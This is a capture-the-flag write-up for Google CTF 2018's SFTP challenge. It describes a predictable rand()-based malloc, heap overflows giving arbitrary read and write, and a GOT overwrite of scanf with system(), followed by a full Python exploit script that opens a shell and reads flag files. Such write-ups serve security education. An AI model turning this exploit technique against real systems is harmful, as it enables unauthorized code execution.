# Writeup for SFTP (pwn, 181 pts), Google CTF Qualifiers 2018

## TL;DR

- Easily bypass the password check using a very simple Z3 script (it was also brute-forcable, but I decided to do it in a more elegant way :P)

- A poor `malloc()` implementation, relies on `srand(time(NULL))`.

- Predict the result returned from `rand()` (used in `malloc()`).

- Leak an address to verify our prediction (optional).

- Find 2 points in time where we can get 2 `malloc()` calls relatively (65535> bytes apart) close to each other.

- Make one of the calls to be a user-controlled data, and the other a pointer that is used to read and write data.
  (Such pointer exists, it actually is: `file_entry.data`)

## The Challenge

The service allows us to connect to an "SFTP" server. We quickly notice the service requires a password authentication.
After authenticating, the service allows us to do several things, similarly to what an SFTP server would allow us to do.
We can create a file, create a directory, create a symlink, read a file, write to a file, delete a file, etc..

## Bypassing the authentication

After reading the disassembly of the function that is responsible for the authentication, we noticed that this can not only be reversed, but it can also be brute-forced quite easily.

After bypassing the authentication, we can find an `sftp.c` source file under `/home/src/sftp.c`, this file is handy and saves quite some reversing time.

Yet, we decided to write a Z3 script to reverse the "hashing" process and retreive the password.
The script can be found below and also in the `find_password.py` script attached.

[find_password.py](https://github.com/j0nathanj/CTF-WriteUps/blob/master/2018/GoogleCTF-2018/pwn/SFTP/find_password.py)


## The Bug

The bug in this challenge is the way `malloc()`, `realloc()` and `free()` are implemented.

`malloc()`'s functionality can be simplified to the following code:

```C
int malloc(size_t size){
	return rand() & 0x1FFFFFFF | 0x40000000;
}
```

Basically, `malloc()` will return a random address within the following address range:
`0x40000000 - 0x5FFFFFFF`. 
When we search for the corresponding `srand` call, we find a call to `srand` occurs once, when the binary loads.
In the same function, the program also `mmap()`s the following address range:`0x40000000 - 0x60100000` as RW memory.

The problem relies in the fact that `malloc()` returns a pointer based on the result of that `rand()` call. So, theoretically, if we know what the is result of the `rand()` call, we can also know what `malloc()` will return!

Using the same "mind-set", if we can predict what `malloc()` will return, we can also trick malloc to return 2 (relatively) close addresses when we call it twice. 
So, let's try to break `srand`, `rand()` and finally, `malloc()`! :)

## The Exploit

The exploit consists of a few parts:
1) Synchronize (if needed) the exploit's timer with the server's timer.

2) Synchornize with the server's `rand()` calls, to allow us a reliable exploit and a reliable `malloc()` prediction. 
After some diggig, we noticed that the first `rand()` call returns the "home" node address (will be explained in pt. 5), and the next 5 `rand()` calls are always made. By knowing that, we can consistently know the home `directory_entry` address, and 
all of the results that `malloc()` will return!

3) Search for 2 points in time, where `malloc()` would return relatively (<65535 bytes apart) close addresses.

4) Use these points in time in such a way that:
    - One of the points in time (will be referred to as "victim") will be a `file_entry` struct, whose `char* data` field will be overwritten later on.
    - The second point in time (will be referred to as "writer") will overflow into the victim, and overwrite it's `char* data` field, and optionally also the `size_t size` field as well.

5) Leak a binary address using the prediction of the home (`"/home/c01db33f"`) `directory_entry` struct (Which is the result of the first `malloc()`, and as we already know, we can predict the result it'll return!).
    - We'll overflow into a `file_entry` struct, and change the pointer to be home's `directory_entry` struct address.
      By doing so, when we read the file's content, we'll get the data that resides in the `directory_entry` struct, allowing us to leak an address in the binary ;D

6) Leak a libc address by overflowing into a `file_entry`'s `char* data` field, we can change it to be an a GOT address, by reading from there we are able to leak an address in libc!

7) Overwrite the GOT entry of `_isoc99_scanf()` with `system()`, allowing us to obtain a shell!

8) Profit :D

### Leak

In the function `new_entry()`, there's a call to `strcpy()` which allows us to data if we simply write a 24 bytes long directory name, and then making a symlink to it. The read will also print off the next 4 bytes the `link_entry` struct, which happen to be 4 bytes from the `entry* target` field (A pointer to the `mmapd()` region.
This allows us to verify our `malloc()` predictions.

### Code Execution

After verifying our predictions, finding good "victim" and "writer" candidates, we can do the following to achieve code execution (As explained in the "The Exploit" section):
1) Overflowing to the "victim" using the "writer", and overwriting the `char* data` field with the home `directory_entry` struct address.
By doing so we leak an address in the binary when we read the victim's file content!

2) Overflowing to the "victim" using the "writer", and overwriting the `char* data` field with a GOT entry address, allowing us to leak an address in libc when we read the victim's file content!

3) Oveflowing into the "victim" using the "writer", and overwriting the `char* data` field with a the GOT entry address of `__isoc99_scanf()`, and writing the address of `system()` to the "victim" file. 
This will overwrite the `__isoc99_scanf()` GOT entry, with the address of `system()`!

4) Enjoy our sweet shell :)

Flag: `CTF{Moar_Randomz_Moar_Mitigatez!}`

The exploit code attached below is very detailed, I added a lot of documentation to it to make the reading of it more convinient.
(The exploit code is also attached, called `exploit.py`)

[exploit.py](https://github.com/j0nathanj/CTF-WriteUps/blob/master/2018/GoogleCTF-2018/pwn/SFTP/exploit.py)

## Exploit Code

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from ctypes import cdll
from itertools import count
from collections import namedtuple
import sys

libc = cdll.LoadLibrary('libc.so.6') # Allow a more accurate/fast function results/calls.
PASSWORD = r'@@=``>QPPP@``=' # Retreived using the `find_password.py` Z3-based script.

def exploit(match, do_debug):
	global r
	DEBUG = do_debug 
	
	################################################################################################################################
	#                                                                                                                               #
	#                           [!] Important Note [!]                                                                              #
	# --------------------------------------------------------------------------------                                              #
	#       The `-0` value may vary between locations around the world, since it depends on the server latency as well.             #
	#       If the exploit does not work remotely, try changing the `-0` value to other negative numbers, i.e.: `-0`, `-1`, etc     # 
	#                                                                                                                               #
	#################################################################################################################################

	sleep_until(match.target_time - (-0 if (not DEBUG) else 0)) # Synchronize with the server if it's a remote exploit.	
	if DEBUG:
		r = process("./sftp")
	else:
		r = remote('sftp.ctfcompetition.com', 1337)
	
	if DEBUG:
		t = libc.time(0)
		if t != match.target_time:
			log.warning("Wrong time synchronization!")	# Should not occur. If it does, please reach out to me :)
			exit()

	r.sendline('yes')
	r.sendline(PASSWORD) # log in using the password we generated.
	
	##########################################################################################
	#                                                                                        #
	#                Allocate writer & victim functionality.                                 #
	#                                                                                        #
	##########################################################################################

	writer_first = match.malloc_writer < match.malloc_victim
	alloc_counter = 0

	#############################################################################################
	#                                                                                           #
	#                   Explanation of the functionality.                                       #
	#            -----------------------------------------------                                #
	#   1) Allocate dummy directories, until we reach the desired rand() result that will       #
	#      produce a good first malloc() address :)                                             #
	#                                                                                           #
	#   2) Allocate the first file.                                                             #
	#                                                                                           #
	#   3) Allocate dummy directories until we reach the second file.                           #
	#                                                                                           #
	#   4) Allocate the second file.                                                            #
	#                                                                                           #
	#############################################################################################
	
	# Step (1):

	# First padding; 
	# Dummy directories to eventually reach our desired malloc() results.
	
	log.info("First padding in progress... ")
	while alloc_counter < min(match.malloc_writer, match.malloc_victim):
		alloc_counter += 1
		do_mkdir('AAAAdummy%d' % alloc_counter)
	
	log.success("Successfully finished the first padding.")

	# Step (2):

	# Allocation of the first entity.
	# An entity is the malloc_writer / malloc_victim.

	log.info("Allocating the first entity.. ")
	alloc_counter += 2
	if writer_first:
		do_put('CCCCwriter', length=65500)
	else:
		do_put('BBBBvictim', length=10)
	
	log.success("First entity successfully allocated.")

	# Step (3):

	# Second padding;
	# Dummy directories between the first entity and the second.

	log.info("Second padding in progress... ")
	while alloc_counter < max(match.malloc_writer, match.malloc_victim):
		alloc_counter += 1
		do_mkdir('AAAAdummy%d' % alloc_counter)
	
	log.success("Successfully finished the second padding.")

	# Step (4):

	# Allocation of the second entity.

	log.info("Allocating the second entity... ")
	alloc_counter += 2
	if writer_first:
		do_put('BBBBvictim', length=10)
	else:
		do_put('CCCCwriter', length=65500)

	
	#####################################################
	#                                                   #
	#           Functions used to gain                  #
	#           Read / Write primitives                 #
	#                                                   #
	#####################################################

	def _set_victim(address, length):
		payload = p64(match.home_addr) + p32(2) + 'SOME_FILENAME\0' + '\0'*6 + p64(length) + p64(address)
		'''
		payload is a `struct file_entry`, which looks like:
		
		struct file_entry {
		struct entry entry;
		size_t size;
		char* data;
		};

		the `entry` struct has:
		1) a pointer to a directory_entry struct ---> p64(match.home_addr) # home is the directory/cwd when the program runs.
		2) an `entry_type` field, which is an integer --> p32(2) # because 2 is defined to be FILE_ENTRY.
		3) a 20 bytes long `name` field (hence the `SOME_FILENAME`+'\x00'*7)

		After overwriting the file_entry, we overwrite the `size` and `data`:

		- p64(length) will overwrite the size.
		- p64(address) will overwrite the data (a `char*`)
		'''
		do_put('CCCCwriter', 'A' * match.mem_dist + payload)

	def do_read(address, length):
		'''
			[!] Arbitrary read primitive.
				
				Actions:
			---------------
			1) Set the victim's `char* data` field to be the address we want to READ FROM.
			2) Set the `size` field to be the AMOUNT OF BYTES we want to read from that address.
			3) Read the data from the given address using the fact that we can read data from a `file_entry`!
		
		Return the data read from the address given.
		'''
		_set_victim(address, length)
		return do_get('SOME_FILENAME')

	def do_write(address, data):
		'''
			[!] Arbitrary write primitive.

				Actions:
			-----------------
			1) Set the victim's address to be the address we want to WRITE TO.
			2) Write the data to the given address using the fact that we can write to a `file_entry` that already exists!
		'''
		_set_victim(address, len(data))
		do_put('SOME_FILENAME', data)

	def memleak(addr):
		'''
			- Read 8 bytes from the given address.
		'''
		return do_read(addr, 8)

	
	
	#############################################
	#                                           #
	#           Exploiting the bugs! :)         #
	#                                           #
	#############################################

	log.info("home directory_entry struct @ 0x%x", match.home_addr)
	
	binary_base = u64(do_read(match.home_addr, 8)[:8].ljust(8, '\x00')) - 0x208be0
	libc_base = u64(memleak(binary_base + 0x0205028)[:8].ljust(8,'\x00')) - 0x06f690
	
	system_addr = libc_base + 0x045390
	__isoc99_scanf_got = binary_base + 0x2050A0

	do_write(__isoc99_scanf_got, p64(system_addr))
	r.sendlineafter('sftp> ', 'ls>/dev/null;sh')

	r.sendline('id;pwd;ls -al;cat fl* /home/*/fl*')
	r.interactive()


#################################################
#                                               #
#       Interaction with the Binary             #
#                                               #
#################################################


def do_mkdir(dir):
	r.sendlineafter('sftp> ', 'mkdir ' + dir)


def do_put(file, content='', length=None):
	if length is None:
		length = len(content)
	content = content.ljust(length, '\0')

	r.sendlineafter('sftp> ', 'put ' + file)
	r.sendline(str(length))
	r.send(content)


def do_get(file):
	r.sendlineafter('sftp> ', 'get ' + file)
	r.sendline()
	r.recvline()
	return r.recvuntil('sftp>', drop=True)




#####################################################################
#                                                                   #
# ~ Timing/Prediction functions                                     #
#                                                                   #
#           Functions used to find the best                         #
#           times for close malloc() results,                       #
#           Allowing us to predict the malloc() result and thus,    #
#           Overflow pointers used!                                 #
#                                                                   #
#####################################################################


def init_prediction(seed):
	"""
	Return the address of the /home/c01db33f node.
	Based on the fact that it's address is based on the first rand() result.
	
	The 5 predictions in the loop are used to synchronize with the binary's rand() results,
	since it uses 5 rands() until we "arrive" at our rand().
	"""
	libc.srand(seed)
	home = prediction()
	for _ in xrange(5):
		prediction()
	return home


def prediction():
	"""
	Predict the address returned by malloc(), assuming the rand() is synchronized with the server's.
	"""
	p = (libc.rand() & 0x1FFFFFFF) | 0x40000000
	return p


def get_min_diff_idxs(lst):
	
	min_pair = None
	min_idxs = None
	min_diff = 0xffffffffffffffffffffffff # big val
	sorted_lst = sorted(lst) # lst is a list of the results from rand(), hence, we need to sort it first! 
	
	for i in xrange(len(sorted_lst)-1):
		if sorted_lst[i+1] - sorted_lst[i] < min_diff:
			min_pair = (sorted_lst[i], sorted_lst[i+1])
			min_diff = sorted_lst[i+1] - sorted_lst[i]
	
	min_idxs = lst.index(min_pair[0]), lst.index(min_pair[1])
	return min_idxs
	

def find_good_time(t):
	"""
	Input: 
		t -- a starting time that we want to start the search for a good malloc diff
	
	Output:
		ExploitInfo(target_time, malloc_writer, malloc_victim, mem_dist, home_addr):
		
		Which is built as follows:
			
			* target_time   - The time when we start to create files. Used to synchronize to the server's time.

			* malloc_writer - The address that malloc() will return for the WRITER (the `char* data` field!).
							  Remember, The writer is the file_entry that'll be used TO overflow into another file.

			* malloc_victim - The address that malloc() will return for the victim file.

			* mem_dist - The "distance" between the malloc_victim and malloc_writer.

			* home_addr - The address that was generated by malloc() to use for the home directory.

	"""
	
	ExploitInfo = namedtuple('ExploitInfo',
							 'target_time malloc_writer malloc_victim mem_dist home_addr')
	

	for time_offset in count(2):
		home_addr = init_prediction(t + time_offset)
		prediction()
		allocs = [prediction() for _ in xrange(100)]
		
		idx_a, idx_b = get_min_diff_idxs(allocs)
		diff = allocs[idx_b] - allocs[idx_a]
		
		if diff < 65000 and abs(idx_a - idx_b) > 1:
			log.info("Writer content @ 0x%x" % allocs[idx_a])
			log.info("Victim file @ 0x%x" % allocs[idx_b])

			return ExploitInfo(target_time=t+time_offset,
							   malloc_writer=idx_a,
							   malloc_victim=idx_b+1,
							   mem_dist=diff,
							   home_addr=home_addr)




#########################################
#                                       #
#         Utility Functions             #
#                                       #
#########################################

def sleep_until(t):
	log.info("Waiting %d seconds... " % (t - libc.time(0)))
	time.sleep(t - time.time())


def verify_pred():
	'''
		[*] Note: 
			This is a standalone function. 
			Meaning: DON'T CALL verify_pred() AND exploit()!

		Functionality:
			- Verify a prediction based on an `strcpy()` leak in `entry->name`.
	'''
	pred = prediction()
	r.sendline('yes')
	r.sendline(PASSWORD)
	r.sendline('mkdir target')
	r.sendline('symlink target link_AAAAAAAAAAAAAABasdf')
	r.sendline('ls')
	r.recvuntil('AAAAAAAAAAAAAAB')
	leak = r.recvuntil('\nsftp>')
	leak = u32(leak.ljust(4,'\x00'))

	info("leak: 0x%x", leak)
	info("pred: 0x%x", pred)

if __name__ == '__main__':
	do_debug = False
	
	if len(sys.argv) > 1:
		if argv[2] == '-L' or argv[2] == '-l':
			do_debug = True
	
	match = find_good_time(libc.time(0))
	exploit(match, do_debug)
```
